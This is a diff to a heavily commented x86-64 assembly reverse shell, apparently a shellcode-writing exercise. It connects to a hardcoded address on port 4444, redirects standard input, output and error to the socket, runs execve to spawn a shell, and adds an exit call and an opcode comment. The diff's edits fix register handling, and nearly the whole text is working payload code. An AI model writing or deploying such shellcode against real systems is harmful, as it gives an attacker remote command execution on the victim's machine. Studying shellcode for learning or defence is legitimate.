@@ -36,7 +36,7 @@ _start:
 ; We need to prepare the sockaddr_in structure
 	sub rsp, 8 ; we allocate 8 bytes on the stack
 	; we need 3 things for the sockaddr_in structure : sin_family, sin_port, sin_addr
-	mov WORD[rsp],0x2 ; sin_family : AF_INET (IPV4)= 2 (little-endian)	 
+	mov WORD[rsp],0x2 ; sin_family : AF_INET (IPV4)= 2 (little-endian) 
 	mov WORD[rsp+0x2],0x5c11 ; sin_port : 4444 en héxa = 115c but in assembly we reverse all the bytes (little-endian)
 	mov DWORD[rsp+0x4], 0x802da8c0 ; sin_addr : IP address of the server in little-endian.
 	; sin_zero is not necessary because it's only used to pad the structure to the size of a struct sockaddr.
@@ -58,22 +58,21 @@ _start:
 	
 	; redirecting the standard input to the socket
 	mov al, 33 ; SYS_DUP2 call = 33 (0x21) you can find it in https://x64.syscall.sh/ (RAX)
-	push r8 ; we push the file descriptor of the socket on the stack
-	pop rdi ; we pop the file descriptor of the socket in RDI
+	mov rdi , r8 ; we put the file descriptor of the socket in RDI
 	xor rsi, rsi ; we xor RSI to get 0 because we want to redirect the standard input (0)
 	syscall
 
 	; redirecting the standard output to the socket
 	mov al, 33 ; SYS_DUP2 call = 33 (0x21) you can find it in https://x64.syscall.sh/ (RAX)
-	push r8 ; we push the file descriptor of the socket on the stack
-	pop rdi ; we pop the file descriptor of the socket in RDI
+	mov rdi , r8 ; we put the file descriptor of the socket in RDI
+	xor rsi, rsi 
 	mov sil, 1 ; we put 1 in RSI because we want to redirect the standard output (1)
 	syscall
 
 	; redirecting the standard error to the socket
 	mov al, 33 ; SYS_DUP2 call = 33 (0x21) you can find it in https://x64.syscall.sh/ (RAX)
-	push r8 ; we push the file descriptor of the socket on the stack
-	pop rdi ; we pop the file descriptor of the socket in RDI
+	mov rdi , r8 ; we put the file descriptor of the socket in RDI
+	xor rsi, rsi 
 	mov sil, 2 ; we put 2 in RSI because we want to redirect the standard error (2)
 	syscall
 
@@ -88,3 +87,11 @@ _start:
 	mov al, 59 ; SYS_EXECVE call = 59 (0x3B) you can find it in https://x64.syscall.sh/ (RAX)
 	cdq ; We clear RDX because we don't have any arguments to pass to execve
 	syscall 
+
+; We need to exit the program
+	xor rax, rax ; We xor RAX to get 0 because we want to call the exit syscall
+	mov al, 60 ; SYS_EXIT call = 60 (0x3C) you can find it in https://x64.syscall.sh/ (RAX)
+	xor rdi, rdi ; We xor RDI to get 0 because we don't have any arguments to pass to exit
+	syscall
+
+	# mov WORD[rsp],0x2 ; in opcodes = \x66\xc7\x04\x24\x02\x00
